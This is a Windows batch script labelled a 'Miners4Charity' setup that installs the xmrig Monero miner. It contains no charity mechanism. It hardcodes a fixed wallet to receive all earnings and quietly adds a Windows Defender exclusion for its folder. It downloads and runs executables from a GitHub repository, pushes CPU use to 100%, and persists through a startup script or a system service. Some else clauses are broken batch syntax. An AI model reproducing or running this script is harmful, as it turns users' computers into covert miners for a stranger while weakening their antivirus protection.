@echo off

set VERSION=1

rem printing greetings

echo Miners4Charity mining setup script v%VERSION%.
echo ^(please report issues to Miners4Charity@gmail.com email^)
echo.

echo Adding the Mining Directory
mkdir %USERPROFILE%\Miners4Charity
powershell -inputformat none -outputformat none -NonInteractive -Command "$USERPROFILE = $env:USERPROFILE; Defender\Add-MpPreference -ExclusionPath ('$USERPROFILE\Miners4Charity')"

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=42uxPgPqt9V9ZpLh8MkZUW2saYJNdrXtXUGtosFGZJdpGHG48Z4i42mHL87oBkkMre9xh1fv9mEnVg1f8ZJnkwqrBDFKNrC

rem this one is optional
set EMAIL=%2


rem checking prerequisites

if [%WALLET%] == [] (
  echo Script usage:
  echo ^> setup_moneroocean_miner.bat ^<wallet address^> [^<your email address^>]
  echo ERROR: Please specify your wallet address
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
exit /b 1


:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

rem calculating port

set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"

if [%EXP_MONERO_HASHRATE%] == [] ( 
  echo ERROR: Can't compute projected Monero hashrate
  exit 
)

if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
set PORT=10001

:PORT_OK

rem printing intentions

set "LOGFILE=%USERPROFILE%\Miners4Charity\moneroocean\xmrig.log"

echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo If needed, miner in foreground can be started by %USERPROFILE%\Miners4Charity\moneroocean\miner.bat script.
echo Mining will happen to %WALLET% wallet.


echo.

if %ADMIN% == 0 (
  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) 
else (
  echo Mining in background will be performed using moneroocean_miner service.
)

echo.
echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% KH/s.
echo. 

timeout 5


rem start doing stuff: preparing miner

echo [*] Removing previous moneroocean miner (if any)
sc stop moneroocean_miner
sc delete moneroocean_miner
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0
echo [*] Removing "%USERPROFILE%\Miners4Charity\moneroocean" directory
timeout 5
rmdir /q /s "%USERPROFILE%\Miners4Charity\moneroocean" >NUL 2>NUL
IF EXIST "%USERPROFILE%\Miners4Charity\moneroocean" GOTO REMOVE_DIR0

echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\Miners4Charity\xmrig.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\Miners4Charity\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download MoneroOcean advanced version of xmrig
  goto MINER_BAD
)

echo [*] Unpacking "%USERPROFILE%\Miners4Charity\xmrig.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\Miners4Charity\xmrig.zip', '%USERPROFILE%\Miners4Charity\moneroocean')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\Miners4Charity\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/7za.exe', '%USERPROFILE%\Miners4Charity\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\Miners4Charity\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking stock "%USERPROFILE%\Miners4Charity\xmrig.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
  "%USERPROFILE%\Miners4Charity\7za.exe" x -y -o"%USERPROFILE%\Miners4Charity\moneroocean" "%USERPROFILE%\Miners4Charity\xmrig.zip" >NUL
  del "%USERPROFILE%\Miners4Charity\7za.exe"
)
del "%USERPROFILE%\Miners4Charity\xmrig.zip"

echo [*] Checking if advanced version of "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'" 
"%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" (
  echo WARNING: Advanced version of "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" is not functional
) 
else (
  echo WARNING: Advanced version of "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" was removed by antivirus
)

echo [*] Looking for the latest version of Monero miner
for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\Miners4Charity\xmrig.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\Miners4Charity\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\Miners4Charity\xmrig.zip"
  exit /b 1
)

:REMOVE_DIR1
echo [*] Removing "%USERPROFILE%\Miners4Charity\moneroocean" directory
timeout 5
rmdir /q /s "%USERPROFILE%\Miners4Charity\moneroocean" >NUL 2>NUL
IF EXIST "%USERPROFILE%\Miners4Charity\moneroocean" GOTO REMOVE_DIR1

echo [*] Unpacking "%USERPROFILE%\Miners4Charity\xmrig.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\Miners4Charity\xmrig.zip', '%USERPROFILE%\Miners4Charity\moneroocean')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\Miners4Charity\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/7za.exe', '%USERPROFILE%\Miners4Charity\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\Miners4Charity\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking advanced "%USERPROFILE%\Miners4Charity\xmrig.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
  "%USERPROFILE%\Miners4Charity\7za.exe" x -y -o"%USERPROFILE%\Miners4Charity\moneroocean" "%USERPROFILE%\Miners4Charity\xmrig.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\Miners4Charity\xmrig.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
    exit /b 1
  )
  del "%USERPROFILE%\Miners4Charity\7za.exe"
)
del "%USERPROFILE%\Miners4Charity\xmrig.zip"

echo [*] Checking if stock version of "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'" 
"%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" (
  echo WARNING: Stock version of "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" is not functional
) else (
  echo WARNING: Stock version of "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" was removed by antivirus
)

exit /b 1

:MINER_OK


echo [*] Miner "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe" is OK


pause


for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%PASS%:%EMAIL%"
)

powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"X\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"pause-on-battery\": *false,', '\"pause-on-battery\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'"
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config.json' | %%{$_ -replace '\"pause-on-active\": *false,', '\"pause-on-active\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config.json'"

copy /Y "%USERPROFILE%\Miners4Charity\moneroocean\config.json" "%USERPROFILE%\Miners4Charity\moneroocean\config_background.json" >NUL
powershell -Command "$out = cat '%USERPROFILE%\Miners4Charity\moneroocean\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\Miners4Charity\moneroocean\config_background.json'" 

rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0xmrig.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
echo :EXIT
) > "%USERPROFILE%\Miners4Charity\moneroocean\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

echo ERROR: Can't find Windows startup directory
exit /b 1

:STARTUP_DIR_OK
echo [*] Adding call to "%USERPROFILE%\Miners4Charity\moneroocean\miner.bat" script to "%STARTUP_DIR%\moneroocean_miner.bat" script
(
echo @echo off
echo "%USERPROFILE%\Miners4Charity\moneroocean\miner.bat" --config="%USERPROFILE%\Miners4Charity\moneroocean\config_background.json"
) > "%STARTUP_DIR%\moneroocean_miner.bat"

echo [*] Running miner in the background
call "%STARTUP_DIR%\moneroocean_miner.bat"
goto OK

:ADMIN_MINER_SETUP

echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\Miners4Charity\nssm.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/nssm.zip', '%USERPROFILE%\Miners4Charity\nssm.zip')"
if errorlevel 1 (
  echo ERROR: Can't download tools to make moneroocean_miner service
  exit /b 1
)

echo [*] Unpacking "%USERPROFILE%\Miners4Charity\nssm.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\Miners4Charity\nssm.zip', '%USERPROFILE%\Miners4Charity\moneroocean')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/7za.exe', '%USERPROFILE%\Miners4Charity\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\Miners4Charity\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking "%USERPROFILE%\Miners4Charity\nssm.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
  "%USERPROFILE%\Miners4Charity\7za.exe" x -y -o"%USERPROFILE%\Miners4Charity\moneroocean" "%USERPROFILE%\Miners4Charity\nssm.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\Miners4Charity\nssm.zip" to "%USERPROFILE%\Miners4Charity\moneroocean"
    exit /b 1
  )
  del "%USERPROFILE%\Miners4Charity\7za.exe"
)
del "%USERPROFILE%\Miners4Charity\nssm.zip"

echo [*] Creating moneroocean_miner service
sc stop moneroocean_miner
sc delete moneroocean_miner
"%USERPROFILE%\Miners4Charity\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe"
if errorlevel 1 (
  echo ERROR: Can't create moneroocean_miner service
  exit /b 1
)
"%USERPROFILE%\Miners4Charity\moneroocean\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\Miners4Charity\moneroocean"
"%USERPROFILE%\Miners4Charity\moneroocean\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\Miners4Charity\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\Miners4Charity\moneroocean\stdout"
"%USERPROFILE%\Miners4Charity\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\Miners4Charity\moneroocean\stderr"

echo [*] Starting moneroocean_miner service
"%USERPROFILE%\Miners4Charity\moneroocean\nssm.exe" start moneroocean_miner
if errorlevel 1 (
  echo ERROR: Can't start moneroocean_miner service
  exit /b 1
)

echo
echo Please reboot system if moneroocean_miner service is not activated yet (if "%USERPROFILE%\Miners4Charity\moneroocean\xmrig.log" file is empty)
goto OK

:OK


powershell -Command "Start-Process '%USERPROFILE%\Miners4Charity\moneroocean\xmrig.exe' "

echo
echo [*] Setup complete
pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b



